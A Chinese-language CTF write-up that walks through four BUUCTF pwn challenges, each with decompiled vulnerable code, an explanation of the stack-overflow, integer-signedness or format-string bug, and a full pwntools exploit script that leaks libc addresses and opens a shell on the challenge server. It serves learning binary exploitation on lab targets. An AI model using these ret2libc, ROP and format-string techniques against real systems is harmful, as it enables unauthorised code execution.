---
title: BUU Pwn Writeup _Day7.28
index: true
icon: codicon:note
category:
  - CTF
  - Writeup
  - Pwn
tag:
  - CTF
  - Pwn
  - Writeup
  - BUUCTF
---

最近刷的题的小集合。

<!-- more -->

## 铁人三项(第五赛区)\_2018\_rop 1

ida看到有vulnerable\_function()函数。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+10h] [ebp-88h] BYREF

  return read(0, buf, 0x100u);
}
```

buf[136]设置了136字节，但是return的read却读了256字节，很明显的栈溢出。

看一眼strings表，也没有/bin/sh，函数表里也没有system，execve之类的函数。

一目了然，必然是ret2libc了。

理一下思路：先填满buf[136]，然后把ebp位置覆盖掉，就可以用write泄露write@got地址了。

| 栈地址 | 内容 | 说明 |
| --- | --- | --- |
| 缓冲区起始 | b’A’\*136 | 填满buf[136] |
| EBP位置 | b’A’\*4 | 覆盖EBP（32位为4字节，4\*8bit） |
| 返回地址 | write@plt | 覆盖为write的PLT |
| 新的返回地址 | main函数的地址 | write执行后的返回地址 |
| 参数1 | 1 | 标准输出 |
| 参数2 | write@got | 泄露write函数的地址 |
| 参数3 | 4（长度） | 32位，读4字节 |

```python
from pwn import *
from LibcSearcher import *

context(os="linux", arch="amd64", log_level="debug")
elf = ELF("./2018_rop")
p = remote("node5.buuoj.cn",28550)

write_plt = elf.plt["write"]
write_got = elf.got["write"]
main = elf.sym["main"]

offset = 136+4

payload = b'a'*(0x88+4) + p32(write_plt) + p32(main) + p32(1) + p32(write_got) +p32(4)
p.sendline(payload)

write_addr = u32(p.recv(4))

libc = LibcSearcher("write", write_addr)
Offset = write_addr - libc.dump("write")

sys_addr = libc.dump("system")+Offset
binsh = libc.dump("str_bin_sh")+Offset

payload = b"a"*offset+p32(sys_addr)+p32(1)+p32(binsh)
p.sendline(payload)
p.interactive()
```

flag\{6f0423b5-2621-4980-945d-ed713285a3d2\}

## bjdctf\_2020\_babystack2 1

惯例上ida分析。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

main函数里定义了char buf[12]和size\_t nbytes。

读取了一个数字到nbytes里，然后转换成int类型进行判断：如果大于10，直接退出。

但是后面又进行了一次类型转换，把nbytes转换成了unsigned int，无符号了。

这里就有点意思了。为什么？

int类型是有正有负的整数，而unsigned int只有大于等于0的整数。unsigned int利用了这个数据类型的所有二进制位。

再看一眼程序，有r开头的寄存器名，64位程序无疑了。

那么这个程序的size\_t 就是8个字节，64个二进制位，非常大的数字。

如果用户输入了一个-1，那么nbytes的内容就是0xFFFFFFFFFFFFFFFF，在int类型下是-1，就可以绕过if判断了。

那么这时，read函数就会向buf[12]读入0xFFFFFFFFFFFFFFFF这么大坨数据，完全能把栈给干爆。

再看看函数表，有个后门函数。

接下来要做的就非常简单了，把栈填满，然后把rbp填满，再把后门函数传入即可。

看一眼栈，总共0x10长。

64位的rbp要想塞满得塞进8个字节的数据，总共要塞0x10+8字节。

```python
from pwn import *
context.log_level = "debug"
p = remote("node5.buuoj.cn",27646)

payload1 = b"-1"
p.sendlineafter(b"[+]Please input the length of your name:\n",payload1)

offset = 0x10+8
backdoor = 0x400726

payload2 = b"a"*offset + p64(backdoor)
p.sendlineafter(b"[+]What's u name?\n",payload2)
p.interactive()
```

flag\{8434b611-f849-4b48-a2ab-030c39235116\}

## jarvisoj\_fm

简单的格式化字符串漏洞。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [esp+2Ch] [ebp-5Ch] BYREF
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(buf, 0, sizeof(buf));
  read(0, buf, 0x50u);
  printf(buf);
  printf("%d!\n", x);
  if ( x == 4 )
  {
    puts("running sh...");
    system("/bin/sh");
  }
  return 0;
}
```

先手动运行一下，输入AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x看一下偏移。

偏移11，记下来。

再在ida中找一下x的地址，是0x0804A02C。

那就好办了。%n可以对指定地址的变量进行修改，修改成在%n之前的字节数，那就用这一招改一下。

```python
from pwn import *

context.log_level = "debug"

str_offset = 11
x_addr = 0x0804A02C

p = process("./fm")
p = remote("node5.buuoj.cn",27913)

payload = p32(x_addr)+b"%11$n"
p.sendline(payload)

p.interactive()
```

因为刚好x\_addr传入之后，字节长度是4，所以不用再加字符来凑偏移了。

## bjdctf\_2020\_babyrop

惯例ida看。

有一个vuln函数，设置了0x20字节的栈空间，read读了0x64字节，很明显的栈溢出。

看看函数表和字符串表，没有后门函数和binsh字符串，只能ret2libc。

程序是64位的，传参方式和32位程序还不太一样，需要用寄存器传参。

这里用ROPgadgets找一下有没有可以用到的gadgets。发现0x400733有一个pop rdi, ret，这是函数的第一个参数的寄存器，可以利用。

于是，用puts函数泄露地址，算出偏移再执行system(“/bin/sh”)，拿到flag。

```python
from pwn import *
from LibcSearcher import *

context(arch="amd64",os="linux",log_level="debug")

p = process("./bjdctf_2020_babyrop")
p = remote("node5.buuoj.cn",26215)

elf = ELF("./bjdctf_2020_babyrop")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.sym["main"]
pop_rdi = 0x400733
offset = 0x20+8

payload = b"a"*offset +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendlineafter("Pull up your sword and tell me u story!\n",payload)
puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(puts_addr))

libc = LibcSearcher("puts", puts_addr)
Offset = puts_addr - libc.dump("puts")
sys_addr = libc.dump("system")+Offset
binsh_addr = libc.dump("str_bin_sh")+Offset

payload = b"a"*offset + p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)
p.sendlineafter("Pull up your sword and tell me u story!\n",payload)

p.interactive()
```
